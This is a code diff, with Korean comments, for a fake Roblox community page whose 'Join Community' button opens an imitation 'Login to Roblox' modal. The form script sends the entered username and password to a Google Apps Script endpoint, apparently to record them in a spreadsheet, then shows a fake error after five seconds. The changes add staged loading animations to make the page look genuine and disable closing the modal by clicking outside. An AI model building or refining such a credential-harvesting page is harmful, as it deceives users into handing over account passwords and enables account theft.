@@ -43,8 +43,8 @@
         }
 
         .logo {
-            width: 28px;
-            height: 28px;
+            width: 26px;
+            height: 26px;
             background-color: #6b6b6b;
             display: flex;
             align-items: center;
@@ -58,8 +58,8 @@
 
         .logo::before {
             content: '';
-            width: 8.5px;
-            height: 8.5px;
+            width: 7.9px;
+            height: 7.9px;
             background-color: white;
             position: absolute;
             animation: logoInnerFadeIn 0.6s ease-out;
@@ -160,6 +160,9 @@
             margin-bottom: 24px;
             padding-bottom: 24px;
             border-bottom: 1px solid #e5e8eb;
+            opacity: 0;
+            animation: textReveal 0s ease-out forwards;
+            animation-delay: 4s;
         }
 
         .page-header h1 {
@@ -174,6 +177,7 @@
             display: flex;
             align-items: center;
             gap: 4px;
+            font-size: 16px;
         }
 
         /* Community Card */
@@ -263,6 +267,19 @@
             font-size: 16px;
             cursor: pointer;
             margin-left: auto;
+            background: linear-gradient(90deg, #d0d0d0 0%, #d0d0d0 35%, #909090 50%, #d0d0d0 65%, #d0d0d0 100%);
+            background-size: 300% 100%;
+            animation: sweepGradient 2.5s linear infinite, btnReveal 0s ease-out forwards;
+            animation-delay: 0s, 3.5s;
+            color: transparent;
+        }
+
+        @keyframes btnReveal {
+            to {
+                background: #0066ff;
+                animation: none;
+                color: white;
+            }
         }
 
         .menu-btn {
@@ -278,6 +295,54 @@
             color: #606468;
             font-size: 14px;
             margin-bottom: 16px;
+        }
+
+        .members-count, .description, .more-text {
+            opacity: 0;
+            animation: textReveal 0s ease-out forwards;
+            animation-delay: 4s;
+        }
+
+        .community-loading-dots {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            gap: 18px;
+            margin: 8px 0;
+            animation: communityLoadingHide 0s ease-out forwards;
+            animation-delay: 4s;
+        }
+
+        .community-loading-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #909499;
+            border-radius: 0px;
+            animation: dotPulse 1.5s ease-in-out infinite;
+        }
+
+        .community-loading-dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .community-loading-dot:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        .community-loading-dot:nth-child(3) {
+            animation-delay: 1s;
+        }
+
+        @keyframes communityLoadingHide {
+            to {
+                display: none;
+            }
+        }
+
+        @keyframes textReveal {
+            to {
+                opacity: 1;
+            }
         }
 
         .description {
@@ -676,11 +741,55 @@
             cursor: not-allowed;
         }
 
+        .loading-dots {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        .loading-dots.show {
+            display: flex;
+        }
+
+        .loading-dot {
+            width: 12px;
+            height: 12px;
+            background-color: #909499;
+            border-radius: 0px;
+            animation: dotPulse 1.5s ease-in-out infinite;
+        }
+
+        .loading-dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .loading-dot:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        .loading-dot:nth-child(3) {
+            animation-delay: 1s;
+        }
+
+        @keyframes dotPulse {
+            0%, 100% {
+                transform: scale(1);
+                background-color: #909499;
+            }
+            50% {
+                transform: scale(1.3);
+                background-color: #d0d0d0;
+            }
+        }
+
         .error-message {
             color: #ff4444;
-            font-size: 14px;
-            margin-top: 8px;
+            font-size: 11px;
             display: none;
+            margin-top: -8px;
+            margin-bottom: -8px;
         }
 
         .error-message.show {
@@ -777,9 +886,12 @@
             .page-header h1 {
                 font-size: 24px;
             }
-
+            .more-link {
+                font-size: 12px;
+                white-space: nowrap;
+            }
             .community-card {
-                padding: 20px;
+                padding: 24px 16px;
             }
 
             .community-header {
@@ -848,9 +960,14 @@
             <button class="modal-close" onclick="closeModal()">×</button>
             <h2 class="modal-title">Login to Roblox</h2>
             <form class="login-form" id="loginForm">
-                <input type="text" class="login-input" id="username" placeholder="Username/Email/Phone" required>
-                <input type="password" class="login-input" id="password" placeholder="Password" required>
+                <input type="text" class="login-input" id="username" placeholder="Username/Email/Phone">
+                <input type="password" class="login-input" id="password" placeholder="Password">
                 <div class="error-message" id="errorMessage">Error</div>
+                <div class="loading-dots" id="loadingDots">
+                    <div class="loading-dot"></div>
+                    <div class="loading-dot"></div>
+                    <div class="loading-dot"></div>
+                </div>
                 <button type="submit" class="login-button" id="loginButton">Log In</button>
             </form>
             <a href="#" class="forgot-link">Forgot Password or Username?</a>
@@ -899,6 +1016,12 @@
                 </div>
                 <button class="join-btn" onclick="openModalWithLoading()">Join Community</button>
                 <button class="menu-btn">⋯</button>
+            </div>
+
+            <div class="community-loading-dots">
+                <div class="community-loading-dot"></div>
+                <div class="community-loading-dot"></div>
+                <div class="community-loading-dot"></div>
             </div>
 
             <p class="members-count"><strong>57 Members</strong></p>
@@ -1022,61 +1145,54 @@
 
     <script>
         function openModalWithLoading() {
-            // 로딩 오버레이 표시
             const loadingOverlay = document.getElementById('loadingOverlay');
             loadingOverlay.classList.add('active');
-            
-            // 0.6초 후 로딩 숨기고 모달 표시
             setTimeout(function() {
                 loadingOverlay.classList.remove('active');
                 document.getElementById('loginModal').classList.add('active');
+                // 폼 초기화
+                document.getElementById('loginForm').reset();
+                document.getElementById('errorMessage').classList.remove('show');
             }, 600);
         }
-
         function closeModal() {
             document.getElementById('loginModal').classList.remove('active');
+            // 폼 초기화
+            document.getElementById('loginForm').reset();
+            document.getElementById('errorMessage').classList.remove('show');
         }
 
-        // Close modal when clicking outside
-        document.getElementById('loginModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeModal();
+        // 모바일 키보드 닫기
+        document.addEventListener('touchstart', function(e) {
+            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA' && e.target.tagName !== 'BUTTON') {
+                document.activeElement.blur();
             }
         });
-
-        // Tab switching
+        // Close modal when clicking outside - DISABLED
+        // document.getElementById('loginModal').addEventListener('click', function(e) {
+        //     if (e.target === this) {
+        //         closeModal();
+        //     }
+        // });
         document.getElementById('tab-about').addEventListener('click', function(e) {
             e.preventDefault();
             switchTab('about');
         });
-
         document.getElementById('tab-store').addEventListener('click', function(e) {
             e.preventDefault();
             switchTab('store');
         });
-
         document.getElementById('tab-affiliates').addEventListener('click', function(e) {
             e.preventDefault();
             switchTab('affiliates');
         });
-
         function switchTab(tabName) {
-            // Remove active from all tabs
             document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            
-            // Hide all content sections
             document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-            
-            // Activate selected tab and content
             document.getElementById('tab-' + tabName).classList.add('active');
             document.getElementById(tabName + '-section').classList.add('active');
         }
-
-        // ===== 구글 시트 연동 설정 =====
-        // 아래 URL을 여러분의 Google Apps Script 웹 앱 URL로 교체하세요
         const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
-
-        // 로그인 폼 제출 처리
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -1084,13 +1200,22 @@
             const password = document.getElementById('password').value;
             const loginButton = document.getElementById('loginButton');
             const errorMessage = document.getElementById('errorMessage');
+            const loadingDots = document.getElementById('loadingDots');
+            
+            // 빈 칸 체크
+            if (!username || !password) {
+                errorMessage.textContent = 'Username and password required';
+                errorMessage.classList.add('show');
+                return;
+            }
             
             // 에러 메시지 숨기기
             errorMessage.classList.remove('show');
+            errorMessage.textContent = 'Error';
             
-            // 버튼 비활성화 및 로딩 표시
-            loginButton.disabled = true;
-            loginButton.textContent = 'Logging in...';
+            // 버튼 숨기고 로딩 점 표시
+            loginButton.style.display = 'none';
+            loadingDots.classList.add('show');
             
             // 구글 시트로 데이터 전송
             fetch(GOOGLE_SCRIPT_URL, {
@@ -1107,8 +1232,8 @@
             
             // 5초 후 에러 메시지 표시 및 버튼 복구
             setTimeout(() => {
-                loginButton.disabled = false;
-                loginButton.textContent = 'Log In';
+                loginButton.style.display = 'block';
+                loadingDots.classList.remove('show');
                 errorMessage.classList.add('show');
             }, 5000);
         });
